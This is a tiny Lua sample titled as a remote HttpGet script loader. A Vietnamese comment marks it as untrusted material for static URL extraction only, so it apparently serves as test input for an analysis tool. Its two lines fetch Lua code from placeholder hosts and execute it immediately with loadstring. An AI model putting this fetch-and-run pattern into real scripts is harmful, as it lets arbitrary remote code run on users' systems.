-- Sample 1: Remote HttpGet Script Loader
-- Coi toàn bộ mã là untrusted - chỉ trích xuất tĩnh URL, không thực thi.

local url = "https://example.invalid/file.lua"
loadstring(game:HttpGet(url))()
loadstring(game:HttpGet("https://example.invalid/secondary_script.lua"))()
